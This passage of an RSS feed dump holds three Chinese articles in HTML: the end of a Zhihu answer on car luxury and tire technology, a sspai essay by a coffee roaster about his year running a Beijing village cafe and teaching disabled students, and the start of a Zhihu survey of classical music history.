data-pid=\"W56FjFdL\">鉴于防爆胎的优势和劣势都比较明显，到2021年马牌又推出了新技术：ContiSeal自修补轮胎，在胎里两侧胎肩之间有一层高黏性的密封胶，当轮胎被异物刺穿时可以迅速封闭穿孔，保持轮胎的密封性。不但省却换胎补胎的麻烦，而且这层衬垫还能有效降低胎噪。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b6c3f3da9caa3d17c296211efeca0a3c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"406\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"t8BT7nhI\">在现在这个汽车电动化快速推进的时代，现在很多纯电车型都会选择专门的静音轮胎，以保证在没有内燃机动力系统噪音的情况下，更大程度的降低轮胎路噪，给电动车以更加静谧的驾驶感觉。比如上文提到的德国马牌轮胎目前拿下欧洲市场40%以上，美洲市场50%以上电动车原配。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-dcf0e1c1c67596b0035684db05859eb2_720w.jpg?rss\" data-caption=\"（静音胎能有效将噪音降低到60分贝以下，相当于普通交谈的分贝）\" data-size=\"normal\" data-rawwidth=\"863\" data-rawheight=\"415\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"IbmhVTH0\">再有，更低的轮胎滚阻也被看重，来降低油耗，或是增加纯电的续航里程。轮胎的技术还在不断发展，适应不断发展的汽车行业和车主的需求。</p>\n<p><br></p>\n<p data-pid=\"2oe1Rrw1\">扯远了，就这样吧。</p>\n<p data-pid=\"SsrFoNkN\">结尾例行点题：汽车的豪华感是一种全面的到位的体贴的“隔绝感”，让你在路途中能保持着自我而舒适的个人小天地——视觉上消除小空间的压迫感、日常接触的地方材质细腻、各种技术手段过滤行驶颠簸和噪音，豪华感便由此而来。</p>\n<p data-pid=\"ApqGHYly\">在乎豪华感的小伙伴：选车、选配色、选选装配置、选轮胎 ！  ：）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/LiuS-photo-wheel?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">LiuS</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/397690793/answer/2343071142?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">74 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/456520830?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">能轻松跑到150码的汽车都有哪些品牌？</a><br><a href=\"http://www.zhihu.com/question/382063286?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">什么品牌的汽车最好？</a><br>\n","link":"http://www.zhihu.com/question/397690793/answer/2343071142?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"年度征文 | 咖啡这门生意，见证形形色色的生活趣事","date":"2022-02-11 03:30:21","description":"\n<p><strong>编注：</strong></p>\n<p>本文是少数派 <a href=\"https://sspai.com/post/70693\" target=\"_blank\">2021 年度征文 </a>活动 <code>#生活 21</code> 标签下的入围文章。本文仅代表作者本人观点，少数派对标题和排版略作调整。</p>\n<p>和往年不同，今年文章的数据表现将很大程度上决定征文活动的最终走向，包括「双倍稿酬（由飞书赞助）」活动奖励、最终票选名单以及征文奖品类型。如果你喜欢这篇文章，不妨通过充电或评论的方式支持作者。</p>\n<hr>\n<p>哈喽，大家好，我是爱咖啡的老林，从 2019 年 7 月 23 日成为少数派的一员至今快三年了。在少数派也写了一些关于咖啡的文章，得到了一些朋友的关注与肯定，也有朋友说学到了一些咖啡知识，这我就满足了。</p>\n<p>2021 年对我来说是特殊的一年，这一年里只产出了 12 个咖啡相关的视频；15 篇咖啡相关的图文内容。这些内容除了在少数派平台发布，还发布在了我的微信公众号「咖啡平方」中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8n8tb34ta9bscpsug.png\"><figcaption>B站频道：老林还年少</figcaption></figure><p>对于这一年的产出，我个人是很不满意的，但因为一些其他因素确实干扰了我的节奏，让我无法集中精力去产出更多的内容，这是我很遗憾的事。但新的一年已经开始，还是要抬头向前看，希望新的一年可以继续学习咖啡知识，输出更多浅显易懂的咖啡内容，继续让更多人认识咖啡，了解咖啡，爱上咖啡。</p>\n<p>2021 年经历了很多事，这些事让我印象深刻，也深有所感，真正意义上的体会到了咖啡就是我的生活，通过咖啡让我的生活更有意思，也更有意义。</p>\n<p>这是一篇我的 2021 年生活总结，希望读到这里的朋友能够找到咖啡在你心里的一抹悸动。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8n95b34ta98874tkg.jpeg\"></figure><p>咖啡于我来说，是生活，也是兴趣所在。如果有一天没喝到一杯咖啡，那这一天味同嚼蜡，一点也不开心。喝了这么多年咖啡，总是想把好喝的咖啡分享给更多的人，但又看到很多介绍咖啡的文章和视频，不成体系，甚至还有错误，就想着能不能通过线下，与消费者面对面的聊咖啡，甚至开设一些兴趣班让更多对咖啡感兴趣，想要在家做一杯好喝的咖啡的朋友了解正确的咖啡知识，冲煮方法。</p>\n<p>本着这个目的，开始寻找合作的伙伴，直到 2021 年 3 月才找到了合作伙伴。庆幸的是我不需要投入什么资金，只需重新设计菜单、选品、选好咖啡豆就可以营业了。</p>\n<p>弄好了这些，我的线下经营就开始了。</p>\n<h2>开咖啡馆就是一场社交</h2>\n<p>可能很多人心里都有一个属于自己的咖啡馆梦。觉得拥有一家咖啡馆就可以「躺平」了。其实不然，咖啡馆卖的不是咖啡，而是人情世故。如果你是「社恐」，想锻炼出「社交牛 x 症」其实开店是很好的选择。</p>\n<p>合作的这家店在北京的村儿里，村儿里有公司，有住户，可以称为「社区店」。在这短短的九个月时间里，接触到了各式各样的人，记忆中也多了不同的故事。</p>\n<h3>演员的生活</h3>\n<p>村儿里的特色就是有很多影视公司，MCN 组织，广告公司等等文娱产业。因此在春夏交替之际很多影视公司、剧组，在频繁的面试演员。而这些演员经常会在面试前来到店里，喝上一杯咖啡，拿出试戏的剧本，开始默默的复习。有的跟几个朋友一起面试，互相讨论。有些则是面试后来到店里，只要看到眉眼上翘，面含微笑的，多半是面试成功了；而面无表情，或对你爱答不理的，证明多半是失败了。</p>\n<p>这些人有个共性，大部分都是 95 后、00 后的女孩子，面试的大本上都是一些有几句台词，能露个脸的龙套。每个人都是独自前来，甚至有的人为了能够去不同的剧组试戏，自己还要拉着一个行李箱，里边带上试戏可能用的衣服、妆造等等。在我这里点个咖啡，就借用卫生间去换衣服，之后再走向新的试戏现场。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8n9db34taatkrkqog.jpeg\"></figure><p>有幸跟之中的一些人聊过。绝大部分不是表演系本科毕业的。基本都属于散兵游勇，有想成名的愿望，所以自己来北京闯荡，每次都是自己接戏，如果能接到，那么最起码几个月的时间里，住宿、吃饭不用发愁，还能赚一些钱。</p>\n<p>她们大部分跟几个小姐妹一起合租，然后信息共享，大家组团一起去跑剧组面试，能面上一个是一个。如果没有机会，那就需要找其他的工作维持生计，而模特类的工作是她们做的比较多的。</p>\n<p>总之，任何行当想从最底层做起来，都是十分困难的。在这个需要各种「运作」的大环境下，除非你有逆天的命运，否则真的是艰难的生活着。</p>\n<p>有意思的是，这些女孩子更喜欢喝美式。拿铁在我接触的这部分群体中比较少见，可能觉得喝牛奶会胖吧。</p>\n<h3>广告公司的冰山一角</h3>\n<p>村儿里的另一个比较多的就是传媒公司或者广告公司。随着自媒体短视频平台的发展，广告形式也变的多种多样，B 端投放的短视频小广告成了去年的拍摄热门，尤其以保险行业为最。</p>\n<p>之所以能接到包场拍摄的活儿，其实还要归功于来买咖啡的小姐姐，她是他们公司做拍摄项目的人，觉得店里的风格非常 Fashion，相比于他们在村儿里找的其他拍摄场景，简直是王炸。因此就直接合作了 8 个场次的拍摄，有手机广告，保险广告，还有一些情景剧类的广告。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8n9lb34ta9bscpsv0.jpeg\"></figure><p>这种小制作，1 个助理，1 个灯光，1 个摄像，1 个项目负责人就组成了这样的拍摄团队。男、女演员也都是兼职，根据相关不同甚至还有台本，这种商单拍摄非常快速，场景切换、灯光布置、服装变化一气呵成，2-3 个小时就能搞定。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8n9tb34taatkrkqp0.jpeg\"></figure><p>我也是非常佩服他们的整套流程与默契程度的。为了创造项目小组的效益，甚至一天要拍 2、3 组完全不同的商单项目，也是满不容易的。但是作为一个喜欢拍视频的人来说，却看的津津有味，让我学习到很多拍摄技巧，灯光布置技巧等等。</p>\n<p>这些广告人非常喜欢喝拿铁，有的摄影非常喜欢喝美式。形成了完全不同的饮用偏好。</p>\n<h3>音乐人的生活与打工人的避暑策略</h3>\n<p>在夏之初，我接触到 2 个人，起初是因为他们每天上午 10 点左右来到店里，点上 2 杯冰美式，喝到中午，然后再来 2 杯冰美式，聊开心了就走。每天如此，这勾起了我的好奇。</p>\n<p>因此等他们再次来店里的时候，我就带着准备好的手冲咖啡，跟他们搭了个讪聊了起来。因而得知，他们 2 个都是独立音乐人，有自己的工作室和公司，承接一些录歌、唱片制作的工作。他们就在村儿里租下了整个小楼作为工作室与住宿之地，就好喝个咖啡什么的，每次都用喝咖啡的时间出来放风、找灵感，之前周围没什么像样的咖啡馆，咖啡也不好喝，直到来了我这里，就觉得咖啡很好喝，所以才会每天都来。就这样熟悉了之后，每次来都能聊聊闲天，互相问候，也变的很随便，每次都像朋友相见一样随和，偶尔也会聊聊家长里短，每次都能聊的很开心。而聊开心的结果就是他们每次与人约谈，或者想要跟朋友一起出来喝一杯，肯定都会想到我，有时候店里忙，顾不上他们，他们也都采用自助形式，自给自足。所以维护好你的客户，你的客户就会给你带来惊喜，我想这就是投之以桃，报之以李吧。</p>\n<p>另一个好玩的事儿，就是一家装饰公司把整栋楼租了下来，但入驻很匆忙，夏天很热，空调还没装，一堆做装修设计的员工被热的受不了，跑来我们这里蹭空调，办公、约谈客户。后来跟几个设计师聊熟了，有一天，他们一个部门的领导说，能不能下午部门过来办公。因为空调在修太热了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8nadb34ta9bscpsvg.jpeg\"></figure><p>我答应了（主要是那几天生意也不好），他们的加入明显提升了营业额。就这么着，连续来了 3 天，这 3 天的营业额就非常的美丽。</p>\n<p>我只想说，互帮互助，远亲不如近邻。</p>\n<h3>做咖啡也能为社会做贡献</h3>\n<p>老话常说：「达则兼济天下」。我虽然还没这能力，也没到这境界，但也想通过自己的学识给社会带来一些什么，可惜一直没成功，没想到转做咖啡这行之后，机会就这么悄然的出现在你的面前。</p>\n<p>这次的机会，也是因为我当时报名参加 SCA 烘焙师课程认识的同学。她本身有咖啡馆和公司，也对接着一些政府方面的业务。每年北京市残联会给各区残联一笔活动经费，就是为了让残疾人可以学习一门手艺，给他们提供一个能够就业的机会或者是一种社会关爱的行动吧，因此总会寻找各个行业的老师来给授课。</p>\n<p>2021 年同时开课的地方有点多，她自己的人不够了，所以想起了我，我一听这完全符合我做咖啡的初衷嘛，所以就答应了下来。一共 8 天时间的课程，有实操，有理论，有体验。我还很认真的准备了课程大纲以及授课 PPT。就这样开启了我 8 天的课程。</p>\n<p>项目方已经帮助备好了物料和设备。从咖啡机、磨豆机、咖啡豆、牛奶、虹吸壶、手冲、法压壶等设备一应俱全。我只需要按照自己的节奏准备就好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8nalb34ta98874tl0.png\"><figcaption>第一天上课前</figcaption></figure><p>第一天的授课仍然让我大受震撼，来了 30 多人，其中有 2 个是街道办的工作人员和老师。参与课程的残疾人中有盲人、智力略微不足的、肢体有些残疾的、有耳朵不太好的，总之各不相同，也让我对这种授课形式有了更深层的认知。</p>\n<p>我把课程基本分为了 2 大部分，第一部分是精品咖啡，第二部分是意式咖啡。</p>\n<p>精品咖啡部分是从种子到杯子的过程，系统分享了从种植到冲煮的全部环节，以及常用的冲泡器具。</p>\n<p>理论讲完，就穿插着手冲咖啡的演示，让他们围观学习，然后进行分组体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8natb34ta9bscpt00.png\"></figure><p>3 天左右的时间，让学员见识了虹吸壶、法压壶、手冲咖啡等精品咖啡的制作工具及制作方法，也普及了咖啡知识，让大家认识到了咖啡中的酸、甜、苦。也纠正了大家在之前听到的不准确或错误的知识点。</p>\n<p>总之学员们觉得收获颇丰，也觉得挺好玩的样子。而街道的辅导老师跟我沟通，让我讲的东西再少点，不要让他们太累，多一些互动，试喝。因此第四天意式咖啡的讲解就做了一些调整，要掌握意式浓缩、美式咖啡、牛奶咖啡、抹茶拿铁 4 款咖啡和饮品的制作方法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8nb5b34taavnbauig.png\"></figure><p>因为意式机操作有高温蒸汽，所以相对比较危险，一直在强调安全相关事宜。</p>\n<p>很多学员在授课过程中表现的都很积极，也有求知欲望，每次都会给他们详细讲解，为了更方便他们理解，我还给他们放了一些产地视频、咖啡综艺节目，甚至比赛视频，在看视频的时候给他们重点讲解，寓教于乐是给这些特殊学员上课的关键。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8nblb34ta98874tlg.png\"><figcaption>2017 年 WBrC 世界冠军 王策</figcaption></figure><p>理论课程很快就学完了，剩下的就是学员自行练习，我在旁边指导，因为 3 天后，会有区残联的领导来视察，并且有一场成果展示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8nbtb34taatkrkqpg.png\"></figure><p>我主要是给区里领导做一个简单的培训总结和汇报，然后就到了学员们进行成果展示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8nc5b34taatkrkqq0.png\"></figure><p>这次成果汇报完毕，就到结业的时候了，在这 8 天的教学生活中也认识到了一个新的群体，他们虽然各有各的不便，但从来没有放弃生活，也没有放弃自己，都在尽可能的学习对他们有用的知识，不论是变成爱好，还是有心想要当做今后的就业方向，我都希望，我帮他们打开了一扇窗。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8ncdb34ta9bscpt0g.png\"><figcaption>结业合照</figcaption></figure><p>其实除了讲课外，我还与这些学员闲聊了一下，他们基本在 30-60+ 之间，跨度比较大。这些人里只有 3、4 个人经常喝咖啡，其他大部分基本上以喝茶或饮料为主。</p>\n<p>管中窥豹，中国咖啡市场还有很长的路要走，消费者也有待挖掘。从这些个例中也发现，很多人对咖啡的理解有些偏差，多半是市场营销导致的。</p>\n<p>而我的目的，是希望更多人，纠正错误观念，传递正确咖啡知识。引导大家喝上一杯好喝的咖啡。</p>\n<h2>我的咖啡生活</h2>\n<p>我的生活、工作中都是围绕咖啡展开的。每天早上雷打不动一杯咖啡，才能唤醒我一天的精神内核。作为一个咖啡烘焙师，以及村儿里的咖啡主理人，为了能给更多的人带来有意思的、好喝的咖啡。我也在不断寻找咖啡生豆，春夏季是每年咖啡豆新产季，进口豆子到港的日子，很多生豆商都会组织杯测会。算了算 2021 年一共跑了 8 场杯测会，喝了包含非洲、中南美洲、亚洲等地上百款豆子，从中选出了当前我在售的和店内使用的咖啡生豆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8nctb34taavnbauj0.png\"></figure><p>为了了解市场和同行的状态，每年的北京咖啡展我都会去，从去年的状况来看，北京的咖啡展，更加趋向于独立咖啡馆+咖啡生豆的环节。一些老牌的咖啡品牌逐渐退出展览，咖啡设备代理商比品牌商自身出现在展览的等过，感觉北京的展览逐步退去专业性，保留更多商业性，个人认为不如上海展。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8nd5b34taatkrkqqg.png\"></figure><p>但是在展览上也能进行杯测，我也参与了三轮杯测，一直没有喝到心仪的豆子，但是在另一个生豆商那里找到了不错的豆子，我问的时候告知没货了，当时还是挺遗憾的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8ndlb34ta9bscpt10.png\"></figure><p>不过在 12 月底的时候新货到了，我就买了点准备试试看，希望能让更多的人喝到这款吧。</p>\n<p>另一点，是要关注北京同行的动态，因此把出展会的咖啡馆喝了一遍，发现特殊处理法充斥市场，风味指向明显，不酸、不苦、甜滋滋是当前市场的风向标。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7r8ndtb34taavnbaujg.png\"></figure><p>同时，也看看咖啡大赛中比赛选手有没有什么新的冲泡思路，给我带来一些灵感，让我回去能够推出一些新品。</p>\n<p>虽然在四处寻豆，但咖啡馆的合作经营并不顺利，因为村儿里的流量实在有限，一直无法做到收支平衡，因此，我的合作方也决定撤出换个地方继续运作，但是咖啡方面不再继续合作，我就在 12 月初退出了短暂的咖啡馆经营。</p>\n<p>虽然退出线下实体经营，但始终坚持做咖啡烘焙，把咖啡豆和挂耳咖啡带给爱喝咖啡的朋友。</p>\n<h2>最后</h2>\n<p>目前我仍然坚持做咖啡烘焙的工作，发现好喝、有意思的咖啡。也准备重点关注我们云南自己的咖啡，其中有一款是我常年在做的，1月初的时候，又发现了一款很有意思的豆子，我还在调整烘焙方案，希望可以尽快推出跟朋友们见面。</p>\n<p>新的一年，我又找到了新的工作方向，年后就会从事某生豆贸易商旗下新成立的子品牌的品牌运营及品控方面的内容。届时会玩出不一样的咖啡喝法，如果你在北京，欢迎来找我玩。</p>\n<p><strong>要过年了，希望新的一年里，朋友们可以一切顺利，身体健康，新年新气象，许过的愿都可以实现！</strong></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，找到数字时代更好的生活方式 🎊</p>\n<p>&gt; 年度回顾、好物推荐…… 更多精彩尽在 <a href=\"http://sspai.com/page/2021\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71248"},{"title":"现在为什么很少有人去创作古典音乐了？","date":"2022-02-11 02:53:56","description":"\n<p data-pid=\"Nf0tHL28\">最近收到了不少邀请，所以趁假期简单写一下吧，如果有错误或者遗漏欢迎指出。本文有很多音视频内容，如果能一边看一边听会更容易理解这个问题。</p>\n<p data-pid=\"Rxpn9eLM\"><b>先上结论：如果我们从时间脉络上来看的话，“古典音乐”的内涵其实一直在扩大，广义上的古典音乐，直到今天还是有很多人去创作的。但是如果指的是“狭义的古典音乐”，那么确实是已经死了。</b>但是音乐的发展不是一个一蹴而就的过程，一种风格的诞生与式微也必然需要漫长的时间，所以本文将主要按照时间顺序（曲目大致按照作曲家的生卒年排序）来梳理“古典音乐”的发展过程，并且说一说为什么古典音乐虽然死了，但是又没死（bushi）。</p>\n<h2>一、早期音乐（Early Music）</h2>\n<p data-pid=\"B26YUdNp\">早期音乐，主要指的是中世纪到文艺复兴时期的音乐，当然也有文献将巴洛克时期的音乐也归到早期音乐的范畴里。<b>这一时期的音乐，通常不被认为属于“古典音乐”的范畴，但是可以认为是西方音乐的初始的形态</b>。更早期的就不说了，说一下这一时期比较有代表性的几种音乐类型：格里高利圣咏（Gregorian chant）和奥尔加农（Organum）。</p>\n<h3>1. 格里高利圣咏</h3>\n<p data-pid=\"tkG_lyDx\">格里高利圣咏是一种由人声演唱的，单声部无伴奏的教会音乐，记谱法与现代的五线谱也有一些差别，用的是纽姆记谱法（Neuma）。这种音乐虽然很原始，但是后续的多声部音乐以及复调音乐却是在这种音乐形态上发展起来的。</p>\n<a href=\"https://www.zhihu.com/video/1474785841633882112\">格里高利圣咏 - Deum Verum</a><h3>2. 奥尔加农</h3>\n<p data-pid=\"rKPcES_m\">奥尔加农则是在格里高利圣咏的基础上又增加了更多的声部，属于最早的多声部音乐。最初的奥尔加农是在格里高利圣咏的声部下方增加一个平行五度或是四度的固定音程声部，又称为“平行奥尔加农”，第二个声部并不具有独立性。不过随着时间的发展，作曲家也开始创作除了平行之外的有更多音程变化的第二声部，复调音乐也就此产生了。</p>\n<a href=\"https://www.zhihu.com/video/1474785998484267009\">奥尔加农</a><h2>二、巴洛克时期（Baroque Music Period）</h2>\n<p data-pid=\"C-1aIiMt\">巴洛克音乐通常指的是1600年至1750年这段时间的欧洲音乐。<b>这段时期的音乐也被认为是最早的“古典音乐”。</b>巴洛克音乐又分为早期巴洛克（1580-1650），中期巴洛克（1630-1700）及晚期巴洛克（1680-1750）。这一时期的音乐以复调音乐为主，并且器乐作品也开始逐渐登上舞台，最早的管弦乐编制也是在这一时期产生的。这一时期的代表作曲家有：蒙特威尔第、让·巴普蒂斯特·吕利、维尔瓦第、亨德尔、J·S·巴赫等等（如果玩过文明系列，应该会比较熟悉这些名字hhh）。</p>\n<h3>1. 早期巴洛克</h3>\n<a href=\"https://www.zhihu.com/video/1475127684879192064\">蒙特威尔第 - Rimanti in Pace</a><h3>2. 中期巴洛克</h3>\n<a href=\"https://www.zhihu.com/video/1475128878235013120\">吕利 - Le Bourgeois Gentilhomm</a><h3>3. 晚期巴洛克</h3>\n<a href=\"https://www.zhihu.com/video/1475129251824959488\">维尔瓦第 - 四季（春）</a><a href=\"https://www.zhihu.com/video/1475129423251255296\">亨德尔 - 水上音乐</a><a href=\"https://www.zhihu.com/video/1475136403583963137\">J·S·巴赫 - 勃兰登堡协奏曲</a><p data-pid=\"yy4YAdiE\">复调音乐在J·S·巴赫这里发展到了顶峰，其作品《赋格的艺术》说是复调音乐的集大成者也不为过。而巴赫之后的作曲家，也逐渐从复调音乐转向了主调音乐的创作。</p>\n<h2>三、古典主义时期（Classical Period）</h2>\n<p data-pid=\"mszmHbn1\">古典主义时期即特指介于巴洛克时期和浪漫主义时期的，大约是1730~1820年的这段时间创作的音乐。这一时期最有名的代表人物就是维也纳三杰（又称第一维也纳乐派 First Viennese School）：海顿、莫扎特和贝多芬。这一时期是也是主调音乐兴起的时期，音乐讲究清晰的层次，和声与旋律同样也清晰明确，并且同时各种音乐体裁逐渐成熟，写作时也需要遵循一定的曲式。而管弦乐的木管组+铜管组+弦乐组+打击乐组的形式以及编制的大小也是这一时期确立下来的。以下这几首耳熟能详的曲目，应该也很符合大众对于“古典音乐”的刻板印象了。</p>\n<a href=\"https://www.zhihu.com/video/1474767265065811968\">海顿 - 惊愕交响曲 （1791）</a><a href=\"https://www.zhihu.com/video/1474768457081819136\">莫扎特 - 40号交响曲 （1788）</a><a href=\"https://www.zhihu.com/video/1474772906564120576\">贝多芬 - 第五交响曲（1808）</a><p data-pid=\"ZtOJRm1s\">和巴赫一样，贝多芬也被认为是一个时代的巅峰，同时也是连接着古典主义到浪漫主义之间的桥梁。</p>\n<h2>四、浪漫主义时期（Romantic Period）</h2>\n<p data-pid=\"PyrHo79m\">浪漫主义音乐主要指的是19世纪（大约1800~1910）时期的音乐。这一时期，体裁和曲式在创作中的重要性也开始下降。浪漫主义作曲家更加注重音乐家的个性化表达，情感抒发，并且出现了很多标题音乐。大多数“古典音乐爱好者”喜欢的曲目及作曲家，基本上都是这一时期的。同样的，浪漫主义时期也分为早期和晚期。早期的代表作曲家有门德尔松、肖邦、舒曼等等。而晚期浪漫主义代表作曲家有勃拉姆斯、柴可夫斯基、李斯特、瓦格纳、马勒、理查·斯特劳斯、里姆斯基·科萨科夫、拉赫玛尼诺夫、斯特拉文斯基等等等等。从早期到晚期，同样也是一个写作逐渐复杂，技术逐渐成熟，并且乐队编制逐渐扩大的过程。除此以外，浪漫主义时期还出现很多民族乐派，因为知乎最多只能上传10个视频，之后的音频就只能放链接了……</p>\n<h3>1. 早期浪漫主义</h3>\n<p data-pid=\"THBKjl1s\">这一时期的作品通常都比较悦耳好听，旋律也都很漂亮。这一时期的很多作曲家的曲目很适合当做古典音乐的入门曲目。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV19E411Z721%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-a0c0dc00ecf6d7300dec350492220dad_bh.jpg\" data-image-width=\"672\" data-image-height=\"378\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">门德尔松 - E小调小提琴协奏曲 （伊扎克·帕尔曼）</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1as411n7La%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-1f4980009a420fb43a2ca5b21d309ee1_bh.jpg\" data-image-width=\"1726\" data-image-height=\"1079\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">肖邦 - 夜曲 Nocturne Op.9  No.2 (Arthur Rubinstein)</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1JV411k78e%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-bcfaa7e97fb1bb747cf12dd5c5b8ea2f_bh.jpg\" data-image-width=\"1017\" data-image-height=\"636\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">舒曼 - C大调幻想曲 Op.17（霍洛维茨演奏）Schumann - Fantasie in C major (Vladimir Horowitz)</a><h3>2. 晚期浪漫主义</h3>\n<p data-pid=\"RSVHirmz\">这一时期，和声技术也在发展，引入了半音体系，同时管弦编制也逐渐扩大。对乐手的技术要求也越来越高，而且写作的篇幅也越来越大。可能有些曲目依然有动听的旋律，但是音乐的形态整体是越来越复杂的。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1n5411L78H%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-5f83a26c17c2ab2fa378941350887103_bh.jpg\" data-image-width=\"540\" data-image-height=\"337\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">柴可夫斯基 胡桃夹子组曲 Op.71a（维也纳爱乐乐团）</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Rs411F7Du%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-178cd70dde0d18021efafb72fab56c71_bh.jpg\" data-image-width=\"1150\" data-image-height=\"719\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">里姆斯基·科萨科夫 - 天方夜谭 作品35</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1eh411U72n%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-d02b885ff3ecb9ede04a286404dbfa38_bh.jpg\" data-image-width=\"1920\" data-image-height=\"1080\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">马勒 - 大地之歌</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Fx411E7Qr%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-984162138e5abf916e6e3a6e8f58bb38_bh.jpg\" data-image-width=\"1280\" data-image-height=\"720\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">拉赫玛尼诺夫 - 第三钢琴协奏曲</a><p data-pid=\"vjlUiCec\">这一时期，在写作上，还有个最明显的转变，那就是古典主义时期，强拍上大多是协和音程或是比较稳定的和弦，而不协和音程及需要解决的和声通常会放在弱拍上，形成一个从弱拍解决到强拍的进行。但是到了浪漫主义时期如果还这样写，那难免会导致张力不够，动力不足，所以这一时期不协和音程或是需要解决的和声开始慢慢出现在强拍上，即从强拍解决到弱拍。同样地，音乐的调性也越来越复杂，从单一而清晰的调性逐渐往模糊调性乃至多调性的方向发展。而瓦格纳的《特里斯坦与伊索尔德》算是一个很重要的标志，标志着调性开始瓦解。这部作品开头的和弦被也被称为“特里斯坦和弦”，通过不断推后主和弦的出现，使得整个曲子的调式游移不定，让听众疑惑的同时，也提高了听众的期待感。而这种一直不让主和弦出现的手段，也一直沿用至今。扯个题外话，虽然是不同的技术，但是同样是为了延迟主和弦的出现，通过Chromatic Median突然转调或是使用和声平移，和声对置来破坏调性，基本上是好莱坞式配乐里的标准技术了。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Tx41187Cy%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-401692871eabb37d5628ead7341f38cc_bh.jpg\" data-image-width=\"1280\" data-image-height=\"720\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow 